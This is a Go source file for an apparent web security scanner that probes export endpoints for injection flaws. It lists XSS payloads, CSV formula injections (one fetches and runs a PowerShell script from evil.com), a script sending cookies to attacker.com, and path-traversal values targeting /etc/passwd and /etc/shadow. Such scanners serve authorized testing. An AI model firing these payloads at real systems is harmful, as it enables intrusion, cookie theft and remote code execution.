package export

import (
	"fmt"
	"net/http"
	"strings"

	"github.com/sirupsen/logrus"
)

// Tester handles export functionality security testing
type Tester struct {
	logger  *logrus.Logger
	client  *http.Client
	baseURL string
}

// New creates a new export tester instance
func New(logger *logrus.Logger, client *http.Client, baseURL string) *Tester {
	return &Tester{
		logger:  logger,
		client:  client,
		baseURL: baseURL,
	}
}

// RunTests performs export functionality security tests
func (t *Tester) RunTests(paths []string) error {
	t.logger.Info("Starting export functionality security tests")

	tests := []struct {
		name string
		fn   func([]string) error
	}{
		{"PDF Export Injection", t.testPDFExport},
		{"CSV Export Injection", t.testCSVExport},
		{"HTML Export Injection", t.testHTMLExport},
		{"Export Parameter Injection", t.testExportParams},
		{"Export Format Manipulation", t.testExportFormat},
	}

	for _, test := range tests {
		if err := test.fn(paths); err != nil {
			t.logger.Warnf("%s test failed: %v", test.name, err)
		}
	}

	return nil
}

// testPDFExport tests for PDF export vulnerabilities
func (t *Tester) testPDFExport(paths []string) error {
	payloads := []string{
		"<iframe src='javascript:alert(1)'></iframe>",
		"<script>alert(document.domain)</script>",
		"<object data='javascript:alert(1)'></object>",
		"<embed src='javascript:alert(1)'></embed>",
		"<link rel='stylesheet' href='javascript:alert(1)'>",
		"<img src='x' onerror='alert(1)'>",
		"<svg onload='alert(1)'>",
		"<xml><%00 alert(1) %></xml>",
	}

	for _, p := range paths {
		if !strings.Contains(strings.ToLower(p), "export") && !strings.Contains(strings.ToLower(p), "pdf") {
			continue
		}

		for _, payload := range payloads {
			headers := map[string]string{
				"Content-Type": "application/json",
			}
			data := fmt.Sprintf(`{"content":"%s"}`, payload)

			resp, err := t.makeRequestWithBody("POST", p+"?format=pdf", headers, data)
			if err != nil {
				return err
			}
			resp.Body.Close()

			if resp.StatusCode == http.StatusOK {
				t.logger.Warnf("PDF export injection possible with payload: %s", payload)
			}
		}
	}

	return nil
}

// testCSVExport tests for CSV export vulnerabilities
func (t *Tester) testCSVExport(paths []string) error {
	payloads := []string{
		"=cmd|' /C calc'!A0",
		"=@SUM(1+1)*cmd|' /C calc'!A0",
		"=cmd|' /C powershell IEX(New-Object Net.WebClient).DownloadString(\"http://evil.com/shell.ps1\")'!A0",
		"+cmd|' /C calc'!A0",
		"-cmd|' /C calc'!A0",
		"@cmd|' /C calc'!A0",
		"=1+1|cmd",
	}

	for _, p := range paths {
		if !strings.Contains(strings.ToLower(p), "export") && !strings.Contains(strings.ToLower(p), "csv") {
			continue
		}

		for _, payload := range payloads {
			headers := map[string]string{
				"Content-Type": "application/json",
			}
			data := fmt.Sprintf(`{"data":"%s"}`, payload)

			resp, err := t.makeRequestWithBody("POST", p+"?format=csv", headers, data)
			if err != nil {
				return err
			}
			resp.Body.Close()

			if resp.StatusCode == http.StatusOK {
				t.logger.Warnf("CSV export injection possible with payload: %s", payload)
			}
		}
	}

	return nil
}

// testHTMLExport tests for HTML export vulnerabilities
func (t *Tester) testHTMLExport(paths []string) error {
	payloads := []string{
		"<script>fetch('http://attacker.com/'+document.cookie)</script>",
		"<img src=x onerror=alert(document.domain)>",
		"<svg/onload=alert(1)>",
		"javascript:alert(1)",
		"<object data='data:text/html,<script>alert(1)</script>'>",
		"<link rel=import href='data:text/html,<script>alert(1)</script>'>",
	}

	for _, p := range paths {
		if !strings.Contains(strings.ToLower(p), "export") && !strings.Contains(strings.ToLower(p), "html") {
			continue
		}

		for _, payload := range payloads {
			headers := map[string]string{
				"Content-Type": "application/json",
			}
			data := fmt.Sprintf(`{"content":"%s"}`, payload)

			resp, err := t.makeRequestWithBody("POST", p+"?format=html", headers, data)
			if err != nil {
				return err
			}
			resp.Body.Close()

			if resp.StatusCode == http.StatusOK {
				t.logger.Warnf("HTML export injection possible with payload: %s", payload)
			}
		}
	}

	return nil
}

// testExportParams tests for export parameter vulnerabilities
func (t *Tester) testExportParams(paths []string) error {
	params := []string{
		"format=../../../../etc/passwd",
		"type=../../windows/win.ini",
		"template=../../../etc/shadow",
		"output=php://filter/convert.base64-encode/resource=../../../etc/passwd",
		"dest=file:///etc/passwd",
		"path=\\\\attacker.com\\share\\file.txt",
	}

	for _, p := range paths {
		if !strings.Contains(strings.ToLower(p), "export") {
			continue
		}

		for _, param := range params {
			resp, err := t.makeRequest("GET", p+"?"+param, nil)
			if err != nil {
				return err
			}
			resp.Body.Close()

			if resp.StatusCode == http.StatusOK {
				t.logger.Warnf("Export parameter injection possible with: %s", param)
			}
		}
	}

	return nil
}

// testExportFormat tests for export format manipulation
func (t *Tester) testExportFormat(paths []string) error {
	formats := []string{
		"php", "jsp", "asp", "aspx",
		"config", "xml", "ini", "sh",
		"htaccess", "htpasswd", "env",
	}

	for _, p := range paths {
		if !strings.Contains(strings.ToLower(p), "export") {
			continue
		}

		for _, format := range formats {
			resp, err := t.makeRequest("GET", p+"?format="+format, nil)
			if err != nil {
				return err
			}
			resp.Body.Close()

			if resp.StatusCode == http.StatusOK {
				t.logger.Warnf("Dangerous export format accepted: %s", format)
			}
		}
	}

	return nil
}

// makeRequest performs an HTTP request
func (t *Tester) makeRequest(method, path string, headers map[string]string) (*http.Response, error) {
	req, err := http.NewRequest(method, t.baseURL+path, nil)
	if err != nil {
		return nil, err
	}

	for k, v := range headers {
		req.Header.Set(k, v)
	}

	return t.client.Do(req)
}

// makeRequestWithBody performs an HTTP request with a body
func (t *Tester) makeRequestWithBody(method, path string, headers map[string]string, body string) (*http.Response, error) {
	req, err := http.NewRequest(method, t.baseURL+path, strings.NewReader(body))
	if err != nil {
		return nil, err
	}

	for k, v := range headers {
		req.Header.Set(k, v)
	}

	return t.client.Do(req)
}
